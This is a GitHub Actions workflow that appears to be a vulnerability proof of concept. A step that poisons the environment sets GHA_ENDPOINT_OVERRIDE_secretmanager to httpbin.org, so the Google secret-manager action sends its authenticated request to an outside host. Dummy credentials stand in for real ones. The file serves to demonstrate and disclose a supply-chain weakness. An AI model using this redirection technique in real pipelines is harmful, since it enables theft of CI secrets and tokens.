name: PoC GHA_ENDPOINT_OVERRIDE Secrets Hijack

on:
  push:
    branches: [main]
  workflow_dispatch:

jobs:
  poc:
    runs-on: ubuntu-latest
    permissions:
      id-token: write
      contents: read
    steps:
      - uses: actions/checkout@v4

      # We don't have a real WIF setup here, so we'll mock the auth step 
      # by manually setting an access token env var that the secrets action uses.
      # The secrets action falls back to standard ADC or GoogleAuth env vars if no service account is provided, 
      # but wait, the secrets action just uses google-auth-library which picks up standard env vars or WIF.
      # Let's see if we can provide a dummy credential to make it attempt the request.
      - name: Setup dummy auth (Simulating successful auth)
        run: |
          # Create a dummy Service Account JSON
          echo '{"type": "service_account", "project_id": "poc-project", "private_key_id": "123", "private_key": "-----BEGIN PRIVATE KEY-----\nMIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQC8uH1+\n-----END PRIVATE KEY-----\n", "client_email": "test@poc-project.iam.gserviceaccount.com", "client_id": "123", "auth_uri": "https://accounts.google.com/o/oauth2/auth", "token_uri": "https://oauth2.googleapis.com/token", "auth_provider_x509_cert_url": "https://www.googleapis.com/oauth2/v1/certs", "client_x509_cert_url": "https://www.googleapis.com/robot/v1/metadata/x509/test%40poc-project.iam.gserviceaccount.com"}' > /tmp/dummy-creds.json
          echo "GOOGLE_APPLICATION_CREDENTIALS=/tmp/dummy-creds.json" >> $GITHUB_ENV

      # Simulates malicious composite action poisoning the environment
      - name: Malicious env poisoning (simulates supply-chain attack)
        run: |
          # Using httpbin.org/get as the endpoint. 
          # The action will append /projects/poc-project/secrets/my-secret/versions/latest:access
          echo "GHA_ENDPOINT_OVERRIDE_secretmanager=https://httpbin.org/get/poc" >> $GITHUB_ENV
          echo "[!] Environment poisoned: GHA_ENDPOINT_OVERRIDE_secretmanager -> httpbin.org"

      - name: Try to get secrets (victim step)
        id: secrets
        uses: google-github-actions/get-secretmanager-secrets@v2
        continue-on-error: true
        with:
          secrets: |-
            token:poc-project/my-secret

      - name: Evidence
        if: always()
        run: |
          echo "=== PROOF: GHA_ENDPOINT_OVERRIDE_secretmanager was used ==="
          echo "Outcome: ${{ steps.secrets.outcome }}"
          echo "If the action failed connecting to httpbin.org (e.g. 404 or 400), it proves the API call was redirected."
